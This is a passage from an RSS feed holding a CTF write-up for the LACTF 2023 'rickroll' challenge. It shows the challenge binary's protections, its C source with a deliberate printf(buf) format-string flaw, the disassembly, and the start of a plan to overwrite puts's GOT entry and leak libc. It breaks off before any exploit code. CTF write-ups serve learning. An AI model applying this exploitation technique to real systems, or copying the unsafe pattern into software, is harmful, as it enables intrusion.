        </item>
        
        <item>
            <title>🇬🇧 LACTF 2023 - pwn/rickroll</title>
            <link>/posts/2023/02/lactf-2023-pwn/rickroll/</link>
            <pubDate>Thu, 23 Feb 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/02/lactf-2023-pwn/rickroll/</guid>
            <description>&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;Third &lt;code&gt;pwn&lt;/code&gt; challenge from the &lt;code&gt;LACTF 2023&lt;/code&gt;. It confirmed that I definitely hate format string vulnerabilities.&lt;/p&gt;
&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Make your own custom rickroll with my new rickroll program!
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://lactf-challs.storage.googleapis.com/uploads/0e4efb3fd75235a554e2fd64de1cb7d38c4bcec35f80204b78200f5938f68b5b/Dockerfile&#34;&gt;&lt;code&gt;Dockerfile&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://lactf-challs.storage.googleapis.com/uploads/dd85b016a5546daee39f65628a67ec14fe38c3bb50198b5df2a3834f195f0b80/rickroll&#34;&gt;&lt;code&gt;rickroll&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://lactf-challs.storage.googleapis.com/uploads/6b2eef3271c037a7f568ce89a86463b71ade68d68734eacd75f514baa78176dc/rickroll.c&#34;&gt;&lt;code&gt;rickroll.c&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;file-information&#34;&gt;File information&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;checksec&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;rickroll&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;rickroll&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/conflict/ctfs/lactf2023/rickroll/rickroll&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Arch&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;amd64-64-little&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Partial&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Stack&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;No&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;canary&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;found&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;enabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;No&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;0x400000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;rickroll&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;ELF&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;64-bit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;LSB&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;executable&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;x86-64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;version&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;SYSV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;dynamically&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;linked&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;interpreter&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;lib64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;ld-linux-x86-64&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;so&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;BuildID&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;sha1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;a86d346d66fd7261ce17804cc837d0c5f1a2cfa8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;GNU&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;Linux&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;3&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;stripped&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, we&amp;rsquo;re going to work on a 64 bits non-stripped dynamically linked executable, with &lt;code&gt;NX&lt;/code&gt; enabled, but it&amp;rsquo;s not a problem for us since we&amp;rsquo;re not going to use a shellcode. Also, it is only &lt;em&gt;Partial RELRO&lt;/em&gt; so we will be able to &lt;em&gt;overwrite &lt;code&gt;GOT&lt;/code&gt; entries&lt;/em&gt;&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>Third <code>pwn</code> challenge from the <code>LACTF 2023</code>. It confirmed that I definitely hate format string vulnerabilities.</p>
<h2 id="description">Description</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Make your own custom rickroll with my new rickroll program!
</span></span></code></pre></div><p><a href="https://lactf-challs.storage.googleapis.com/uploads/0e4efb3fd75235a554e2fd64de1cb7d38c4bcec35f80204b78200f5938f68b5b/Dockerfile"><code>Dockerfile</code></a>, <a href="https://lactf-challs.storage.googleapis.com/uploads/dd85b016a5546daee39f65628a67ec14fe38c3bb50198b5df2a3834f195f0b80/rickroll"><code>rickroll</code></a>, <a href="https://lactf-challs.storage.googleapis.com/uploads/6b2eef3271c037a7f568ce89a86463b71ade68d68734eacd75f514baa78176dc/rickroll.c"><code>rickroll.c</code></a></p>
<h2 id="file-information">File information</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">rickroll</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">file</span> <span style="color:#f92672">rickroll</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ctfs/lactf2023/rickroll/rickroll&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">rickroll</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">a86d346d66fd7261ce17804cc837d0c5f1a2cfa8</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>So, we&rsquo;re going to work on a 64 bits non-stripped dynamically linked executable, with <code>NX</code> enabled, but it&rsquo;s not a problem for us since we&rsquo;re not going to use a shellcode. Also, it is only <em>Partial RELRO</em> so we will be able to <em>overwrite <code>GOT</code> entries</em></p>
<p>We&rsquo;re given a dockerfile, so we can pull the <code>libc</code> and the <code>dynamic linker</code> from the container to match the remote env</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@023e43a6f3af:/chal# ldd rickroll
</span></span><span style="display:flex;"><span>	linux-vdso.so.1 <span style="color:#f92672">(</span>0x00007fff54d5e000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>	libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0x00007f4182295000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>	/lib64/ld-linux-x86-64.so.2 <span style="color:#f92672">(</span>0x00007f418246e000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>root@023e43a6f3af:/chal# ls -la /lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">12</span> Oct <span style="color:#ae81ff">14</span> 19:35 /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.31.so
</span></span><span style="display:flex;"><span>root@023e43a6f3af:/chal# cp /lib/x86_64-linux-gnu/libc-2.31.so ./
</span></span><span style="display:flex;"><span>root@023e43a6f3af:/chal# ls
</span></span><span style="display:flex;"><span>Dockerfile  bruteforce.py  flag.txt  libc-2.31.so  rickroll  rickroll.c  solve.py
</span></span></code></pre></div><p>For the source code, there is no need to decompile the file or to struggle with some pseudo-code because we have the <code>.c</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> main_called <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (main_called) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;nice try&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    main_called <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdout, NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Lyrics: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">256</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(buf, <span style="color:#ae81ff">256</span>, stdin);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Never gonna give you up, never gonna let you down</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Never gonna run around and &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(buf);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Never gonna make you cry, never gonna say goodbye</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Never gonna tell a lie and hurt you</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
<p>We can see by looking at the code that there is a call to <code>fgets()</code> that reads <code>256 bytes</code> and stores them in the <code>buf</code> variable that is <code>256 bytes</code> long, so no <em>buffer overflow</em> here&hellip;</p>
<p>But we can see this very dangerous line:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(buf);
</span></span></code></pre></div><p>This shows that the program is vulnerable to <em>format string exploit</em>. So we will be able to leak addresses from the <code>stack</code> and eventually modify some <code>entries</code>.</p>
<p>If we start thinking about our exploit here, we quickly see we&rsquo;re going to be stuck&hellip; There is no win function so we have to <em>make</em> our way to a shell, but to do that we would need to have a leak of the <code>libc</code>&hellip; That&rsquo;s not a problem since we know there is a <em>format string vulnerability</em>, but the main function doesn&rsquo;t loop so we only have one input to leak <code>libc</code> and overwrite a <code>libc</code> entry&hellip; this is impossible</p>
<blockquote>
<p>I struggled <strong>a lot</strong> on this step, I couldn&rsquo;t figure out how to loop main somehow&hellip; And I ended up seeing something interesting</p></blockquote>
<p>By taking a look at the <code>main</code> function in the <em>executable</em> (and not the <code>.c</code> file) by disassembling it, we see that the last <code>printf</code> was replaced by a <code>puts</code> (probably by the compiler)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main 
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401152</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401153</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401156</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	sub    rsp,<span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040115d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:	mov    eax,DWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2f09</span>]        <span style="color:#75715e"># 0x40406c &lt;main_called&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401163</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">17</span><span style="color:#f92672">&gt;</span>:	test   eax,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401165</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">19</span><span style="color:#f92672">&gt;</span>:	je     <span style="color:#ae81ff">0x40117d</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">43</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401167</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe9a</span>]        <span style="color:#75715e"># 0x402008</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040116e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401173</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401178</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">38</span><span style="color:#f92672">&gt;</span>:	jmp    <span style="color:#ae81ff">0x4011fd</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">171</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040117d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">43</span><span style="color:#f92672">&gt;</span>:	mov    DWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2ee5</span>],<span style="color:#ae81ff">0x1</span>        <span style="color:#75715e"># 0x40406c &lt;main_called&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401187</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">53</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2ec2</span>]        <span style="color:#75715e"># 0x404050 &lt;stdout@GLIBC_2.2.5&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040118e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">&gt;</span>:	mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401193</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401196</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">68</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x401040</span> <span style="color:#f92672">&lt;</span>setbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040119b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe6f</span>]        <span style="color:#75715e"># 0x402011</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011a2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011a7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">85</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x401050</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011ac</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">90</span><span style="color:#f92672">&gt;</span>:	mov    rdx,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2ead</span>]        <span style="color:#75715e"># 0x404060 &lt;stdin@GLIBC_2.2.5&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011b3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">97</span><span style="color:#f92672">&gt;</span>:	lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x100</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011ba</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">104</span><span style="color:#f92672">&gt;</span>:	mov    esi,<span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011bf</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">109</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011c2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">112</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x401060</span> <span style="color:#f92672">&lt;</span>fgets<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011c7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">117</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe52</span>]        <span style="color:#75715e"># 0x402020</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011ce</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">124</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011d3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">129</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x401050</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011d8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">134</span><span style="color:#f92672">&gt;</span>:	lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x100</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011df</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">141</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011e2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">144</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011e7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">149</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x401050</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011ec</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">154</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe7d</span>]        <span style="color:#75715e"># 0x402070</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011f3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">161</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011f8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">166</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011fd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">171</span><span style="color:#f92672">&gt;</span>:	leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011fe</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">172</span><span style="color:#f92672">&gt;</span>:	ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>So here is what we&rsquo;re going to do:</p>
<ul>
<li>First, we will overwrite <code>puts</code>&rsquo;s <code>GOT</code> entry by <em>any address from the main function</em> thanks to our <em>format string vuln</em>, so that when the code reaches the <code>puts</code> at the bottom of <code>main</code>, it goes back up</li>
<li>Then, we will leak <code>libc</code> and calculate its base</li>
